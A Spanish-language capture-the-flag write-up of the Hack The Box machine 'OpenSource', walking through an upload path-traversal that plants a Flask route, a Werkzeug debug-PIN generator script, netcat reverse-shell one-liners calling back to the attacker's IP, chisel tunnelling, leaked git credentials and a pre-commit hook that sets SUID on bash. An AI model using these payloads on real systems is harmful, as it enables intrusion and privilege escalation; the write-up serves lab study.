---
layout: post
title: OpenSource
date: 2023-03-09
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, eCPPTv2, OSCP]
---
___

<center><img src="/writeups/assets/img/OpenSource-htb/OpenSource.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Enumeración de Proyecto Git

* Information Disclosure

* Arbitrary File Upload

* LFI

* Abuso de Werkzeug - Bypass PIN

* Remote Port Forwarding

* Pivoting

* Abuso de Gitea

* Abuso de tarea CRON

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.164 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 17:04 GMT
Nmap scan report for 10.10.11.164
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.164 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 17:07 GMT
Nmap scan report for 10.10.11.164
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e59057ca958c923900f7523823d055f (RSA)
|   256 48a853e7e008aa1d968652bb8856a0b7 (ECDSA)
|_  256 021f979e3c8e7a1c7caf9d5a254bb8c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Thu, 09 Mar 2023 17:07:22 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Thu, 09 Mar 2023 17:07:22 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=3/9%Time=640A124C%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,1039,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20Py
SF:thon/3\.10\.3\r\nDate:\x20Thu,\x2009\x20Mar\x202023\x2017:07:22\x20GMT\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x205
SF:316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20\
SF:x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\
SF:"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n
SF:\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!<
SF:/title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jquer
SF:y-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stati
SF:c/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script\
SF:x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\x
SF:20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround\
SF:.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=
SF:\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<lin
SF:k\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boot
SF:strap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hre
SF:f=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20\
SF:x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\n
SF:Server:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Thu,\x2009\x
SF:20Mar\x202023\x2017:07:22\x20GMT\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x200
SF:\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML
SF:\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x2
SF:0\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equi
SF:v=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20
SF:</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Er
SF:ror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:
SF:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20requ
SF:est\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20B
SF:ad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\
SF:x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.44 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb```, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.164
http://10.10.11.164 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.2 Python/3.10.3], IP[10.10.11.164], JQuery[3.4.1], Python[3.10.3], Script, Title[upcloud - Upload files for Free!], Werkzeug[2.1.2]
```

La página principal se ve así:

<img src="/writeups/assets/img/OpenSource-htb/1.png" alt="">

Puedo descargar un comprimido

<img src="/writeups/assets/img/OpenSource-htb/2.png" alt="">

Corresponde a un proyecto de Github

```null
ls -la
total 28
drwxr-xr-x 5 root root 4096 Mar  9 17:10 .
drwxr-xr-x 3 root root 4096 Mar  9 17:10 ..
drwxrwxr-x 5 root root 4096 Apr 28  2022 app
-rwxr-xr-x 1 root root  110 Apr 28  2022 build-docker.sh
drwxr-xr-x 2 root root 4096 Apr 28  2022 config
-rw-rw-r-- 1 root root  574 Apr 28  2022 Dockerfile
drwxrwxr-x 8 root root 4096 Mar  9 17:11 .git
```

```null
git log
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```


Aplico un diff par ver la diferencia con el otro commit

```null
git diff ee9d9f1ef9156c787d53074493e39ae364cd1e05
diff --git a/Dockerfile b/Dockerfile
index 76c7768..5b0553c 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -29,7 +29,6 @@ ENV PYTHONDONTWRITEBYTECODE=1
 
 # Set mode
 ENV MODE="PRODUCTION"
-# ENV FLASK_DEBUG=1
 
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

Todo este proyecto está desplegando en el puerto 80. En la ruta ```/upcloud```, puedo subir archivos

<img src="/writeups/assets/img/OpenSource-htb/3.png" alt="">

En el archivo de configuración ```config/supervisord.conf``` se puede ver que es root quien despliega el servicio

```null
[supervisord]
user=root
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:flask]
command=python /app/run.py
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```

La estructura de como van a almacenarse es la siguiente:

```null
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Puedo subir un archivo en ```PHP```, pero no lo interpreta

<img src="/writeups/assets/img/OpenSource-htb/4.png" alt="">

```null
curl http://10.10.11.164/uploads/cmd.php
<?php
  system($_REQUEST['cmd']);
?>
```

En ```utils.py``` se puede ver en que consiste la función que se encarga de obtener el archivo

```null
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")
```

Está tratando de eliminar ```../``` del nombre del archivo. En caso de no poner nada como nombre, aparece un error en el que se leakea una ruta

<img src="/writeups/assets/img/OpenSource-htb/5.png" alt="">

Se puede bypassear de una forma muy sencilla. No puedo hacer un directory path traversal

```null
python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.path.join(os.getcwd(), "public", "uploads", "test")
'/home/rubbx/Desktop/HTB/Machines/OpenSource/source/app/app/public/uploads/test'
```

Pero en caso de introducir al comienzo una barra, la toma como prioritaria con respecto a la función ```get_file_name(f.filename)```

```null
>>> os.path.join(os.getcwd(), "public", "uploads", "/test")
'/test'
```

Puedo tratar de crear un nuevo ```views.py``` con una función que se encargue de enviarme una reverse shell

```null
@app.route('/pwned')
def pwned():
    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.9 443 >/tmp/f")
```

Lo intercepto con ```BurpSuite``` y le cambio el nombre a ```/app/app/views.py```

```null
curl -s -X GET http://10.10.11.164/pwned
```

Gano acceso a un contenedor

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.164] 35385
sh: can't access tty; job control turned off
/app # whoami
root
/app # ip a    
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # python3 -c 'import pty; pty.spawn("/bin/sh")'
/ # ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
/ # export TERM=xterm
/ # export SHELL=sh
/ # stty rows 55 columns 209
```

Hau un LFI en la ruta ```/uploads```

```null
curl 'http://10.10.11.164/uploads/..//etc/passwd' --path-as-is
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

Aplico fuzzing para descubrir rutas en la web

```null
gobuster dir -u http://10.10.11.164 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.164
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/09 21:38:50 Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 200) [Size: 1563]
```

Encuentra un ```/console```. Está bloqueada por un pin

<img src="/writeups/assets/img/OpenSource-htb/6.png" alt="">

Descargo de [Hactricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) un script que se encarga de generar el pin. Para ello necesito obtener varios valores, aprovechándome del LFI y las rutas que se leakeaban en los errores

<img src="/writeups/assets/img/OpenSource-htb/7.png" alt="">

Obtengo la MAC

```null
curl -s -X GET 'http://10.10.11.164/uploads/..//sys/class/net/eth0/address' --path-as-is
02:42:ac:11:00:03
```

La convierto a decimal

```null
python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0242ac110003
2485377892355
```

Y obtengo el otro valor

```null
curl 'http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id' --path-as-is --ignore-content-length
2702ea2c-f783-4553-8988-17df49318302
```

```null
curl 'http://10.10.11.164/uploads/..//proc/self/cgroup' --path-as-is --ignore-content-length
12:hugetlb:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
11:freezer:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
10:rdma:/
9:devices:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
8:pids:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
7:net_cls,net_prio:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
6:blkio:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
5:cpuset:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
4:cpu,cpuacct:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
3:memory:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
2:perf_event:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
1:name=systemd:/docker/b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345
0::/system.slice/snap.docker.dockerd.service
```

La idea es compactar este con el anterior. El script quedaría así:

```null
import hashlib
from itertools import chain
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892355',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '2702ea2c-f783-4553-8988-17df49318302b708f3d89365eba0b8a5d112625e230edd7df211a4ce0d5f17fab8ab7273d345'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

Al ejecutar obtengo el pin

```null
python3 pin_generator.py
226-144-365
```

Pero al introducirlo me pone que no es válido

<img src="/writeups/assets/img/OpenSource-htb/8.png" alt="">

Esto se debe a que el algoritmo que se está empleando, no corresponde a la versión.

<img src="/writeups/assets/img/OpenSource-htb/9.png" alt="">

Lo cambio de ```md5``` a ```sha1```

```null
h = hashlib.sha1()
```

```null
python3 pin_generator.py
138-826-536
```

Ahora puedo ejecutar comandos desde el ```WerkZeug```

<img src="/writeups/assets/img/OpenSource-htb/10.png" alt="">

Me envío una reverse shell

```null
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.9 443 >/tmp/f").read().strip()
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.164] 44719
sh: can't access tty; job control turned off
/app # python3 -c 'import pty; pty.spawn("/bin/sh")'          
/app # ^[[6;8R^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
/app # export TERM=xterm
/app # export SHELL=sh
/app # stty rows 55 columns 209
```

Esto sería otra forma de ganar acceso al contenedor

```null
/app # whoami
root
/app # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

En el proyecto de Github hay otro branch

```null
git branch
  dev
* public
```

```Dev``` tiene más commits que ```public```

```null
git log dev --oneline
c41fede (dev) ease testing
be4da71 added gitignore
a76f8f7 updated
ee9d9f1 initial
```

Inspecciono los cambios para ```updated```

```null
git show a76f8f7
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
diff --git a/app/app/views.py b/app/app/views.py
index f2744c6..0f3cc37 100644
--- a/app/app/views.py
+++ b/app/app/views.py
@@ -6,7 +6,17 @@ from flask import render_template, request, send_file
 from app import app
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/download')
+def download():
+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
+
+
+@app.route('/upcloud', methods=['GET', 'POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -20,4 +30,4 @@ def upload_file():
 @app.route('/uploads/<path:path>')
 def send_report(path):
     path = get_file_name(path)
-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\ No newline at end of file
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Se pueden ver credenciales en texto claro, ```dev01:Soulless_Developer#2022```. No puedo conectarme por SSH proporcionando la contraseña, está deshabilitado

```null
ssh dev01@10.10.11.164
The authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.
ED25519 key fingerprint is SHA256:LbyqaUq6KgLagQJpfh7gPPdQG/iA2K4KjYGj0k9BMXk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.164' (ED25519) to the list of known hosts.
dev01@10.10.11.164: Permission denied (publickey).
```

No tengo conectividad para transferirme archivos al contenedor. Pero sí que puedo aprovecharme del netcat

```null
/tmp # nc 172.17.0.1 22 -zv
172.17.0.1 (172.17.0.1:22) open
```

Voy a suponer que esta IP corresponde a la máquina host

```null
/tmp # for port in $(seq 1 65535); do nc 172.17.0.1 $port -zv; done
172.17.0.1 (172.17.0.1:22) open
172.17.0.1 (172.17.0.1:80) open
172.17.0.1 (172.17.0.1:3000) open
172.17.0.1 (172.17.0.1:6000) open
172.17.0.1 (172.17.0.1:6001) open
172.17.0.1 (172.17.0.1:6002) open
172.17.0.1 (172.17.0.1:6003) open
172.17.0.1 (172.17.0.1:6004) open
172.17.0.1 (172.17.0.1:6005) open
172.17.0.1 (172.17.0.1:6006) open
172.17.0.1 (172.17.0.1:6007) open
```

Me transfiero el ```chisel```

```null
nc -nlvp 8000 < chisel
```

```null
/tmp # cat /dev/tcp/10.10.16.9/8000 > chisel
```

En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Y en el contenedor como cliente

```null
./chisel client 10.10.16.9:1234 R:socks &>/dev/null &
```

Añado una configuración en el ```BurpSuite``` para poder pasar por el tunel de SOCKS5

<img src="/writeups/assets/img/OpenSource-htb/11.png" alt="">

Es un ```Gitea```

<img src="/writeups/assets/img/OpenSource-htb/12.png" alt="">

Las credenciales de antes son válidas para iniciar sesión

<img src="/writeups/assets/img/OpenSource-htb/13.png" alt="">

Dentro hay un directorio ```.ssh``` con una clave ```id_rsa```

<img src="/writeups/assets/img/OpenSource-htb/14.png" alt="">

Gano acceso al sistema como ```dev01```

```null
ssh -i id_rsa dev01@10.10.11.164
The authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.
ED25519 key fingerprint is SHA256:LbyqaUq6KgLagQJpfh7gPPdQG/iA2K4KjYGj0k9BMXk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.164' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar 10 10:34:54 UTC 2023

  System load:  0.16              Processes:              223
  Usage of /:   75.4% of 3.48GB   Users logged in:        0
  Memory usage: 22%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There are 2 zombie processes.


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$ 
```

Puedo ver la primera flag

```null
dev01@opensource:~$ cat user.txt 
35491148b8dc0b12f20a8cef52eda723
```

# Escalada

En el directorio personal del usuario ```git``` hay un archivo de configuración

```null
dev01@opensource:/home/git$ ls -la
total 16
drwxr-xr-x 3 git  git  4096 May  4  2022 .
drwxr-xr-x 4 root root 4096 May 16  2022 ..
-rw-r--r-- 1 git  git   112 Apr 27  2022 .gitconfig
drwx------ 2 git  git  4096 May  4  2022 .ssh
dev01@opensource:/home/git$ cat .gitconfig 
[user]
	name = Gitea
	email = gitea@fake.local
[core]
	quotePath = false
[receive]
	advertisePushOptions = true
```

Subo y ejecuto el ```pspy```. Encuentra una tarea que se ejecuta por ```root```

```null
2023/03/10 10:43:01 CMD: UID=0    PID=18830  | /bin/bash /usr/local/bin/git-sync 
2023/03/10 10:43:01 CMD: UID=0    PID=18829  | /bin/sh -c /usr/local/bin/git-sync 
2023/03/10 10:43:01 CMD: UID=0    PID=18828  | /usr/sbin/CRON -f 
2023/03/10 10:43:01 CMD: UID=0    PID=18831  | git status --porcelain 
2023/03/10 10:43:01 CMD: UID=0    PID=18834  | git commit -m Backup for 2023-03-10 
2023/03/10 10:43:01 CMD: UID=0    PID=18836  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2023/03/10 10:43:01 CMD: UID=0    PID=18835  | git push origin main 
```

Puedo leer el contenido del script

```null
dev01@opensource:/tmp$ ls -l /usr/local/bin/git-sync
-rwxr-xr-x 1 root root 239 Mar 23  2022 /usr/local/bin/git-sync
dev01@opensource:/tmp$ cat /usr/local/bin/git-sync
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

En caso de que se detecten cambios en el repositorio git, se creará un nuevo commit y se sincronizarán los cambios. El único repositorio se encuentra en mi directorio personal

```null
dev01@opensource:/$ find \-name .git 2>/dev/null 
./home/dev01/.git
```

Corresponde al ```Gitea``` donde extraje la ```id_rsa```. Existe una forma en la que puedo ejecutar comandos abusando del ```pre-commit```

<img src="/writeups/assets/img/OpenSource-htb/15.png" alt="">

```null
dev01@opensource:~$ echo 'chmod u+s /bin/bash' > ".git/hooks/pre-commit"
dev01@opensource:~$ chmod +x /home/dev01/.git/hooks/pre-commit
```

La bash se convierte en SUID y puedo ver la segunda flag